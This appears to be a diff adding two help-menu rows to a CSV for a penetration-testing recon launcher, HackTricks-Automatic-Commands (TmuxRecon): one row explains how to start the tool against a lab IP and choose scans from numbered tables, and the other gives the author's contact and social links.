+Help,Help,Help Menu,Usage,In case you are uncomfortable at first,"#Usage Once Build.sh has been run, HackTricks-Automatic-Commands will have been added to your path. Type ""HAC 10.10.10.5 -i tilix"" or ""HAC 10.10.10.5 -i tmux"" and you will be yeeting with a cyber cannon! From the ""Main Table,"" type the corresponding number of a protocol for which you would like to run a scan. From the ""Protocol Table,"" click the corresponding number of a scan you would like to run. The scan will be kicked off in another tab. Hit enter to return to the ""Main Table."" You can change the variables by going to the ""Variables Table."" If there is a scan or series of scans for a protocol, you would like to add, edit Main.csv following the guidelines in this README (it's pretty straight forward). Tables and commands can be added while TmuxRecon is running, and it will be populated once Main.csv is saved. 
+",Verified,3
+Help,Help,Help Menu,Contact Me,"Report bugs, ask for assistance, request add-on's","#Contact me at CoolHandSquid@gmail.com You can also find me on: GitHub: https://github.com/CoolHandSquid Twitter: https://twitter.com/CoolHandSquid Facebook: https://www.facebook.com/CoolHandSquid/ Website: http://CoolHandSquid.com LinkedIn: https://www.linkedin.com/in/christopherschmid32/
+",Verified,4
